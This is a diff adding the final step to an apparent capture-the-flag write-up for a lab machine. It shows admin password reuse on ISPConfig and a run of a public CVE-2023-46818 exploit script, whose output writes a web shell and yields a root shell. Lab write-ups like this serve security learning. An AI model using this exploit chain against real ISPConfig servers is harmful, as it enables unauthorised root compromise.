@@ -309,3 +309,25 @@ Port `8080` is not accessible from outside the machine, so I had to setup a SSH 
 
 ![ISP Config page](/docs/assets/2025-05/htb-nocturnal-5.png)
 
+Trying out different username/password combinations, `admin` user uses the same password that `tobias` does.
+
+After some some messing around, I saw online that `ISP Config` is a well known product, and it also has an well known vulnerability: [CVE-2023-46818](https://github.com/ajdumanhug/CVE-2023-46818).
+
+All I had to do was get the Python payload to the machine and:
+```
+tobias@nocturnal:/tmp$ python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse
+[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
+[+] Login successful!
+[+] Fetching CSRF tokens...
+[+] CSRF ID: language_edit_2340f493b264f3459b59c6ab
+[+] CSRF Key: 172b4c98ebd3375e56c1f50adf0e1fe9c2dae2cf
+[+] Injecting shell payload...
+[+] Shell written to: http://localhost:8080/admin/sh.php
+[+] Launching shell...
+
+ispconfig-shell# id
+uid=0(root) gid=0(root) groups=0(root)
+
+ispconfig-shell# cat /root/root.txt
+<root flag>
+```
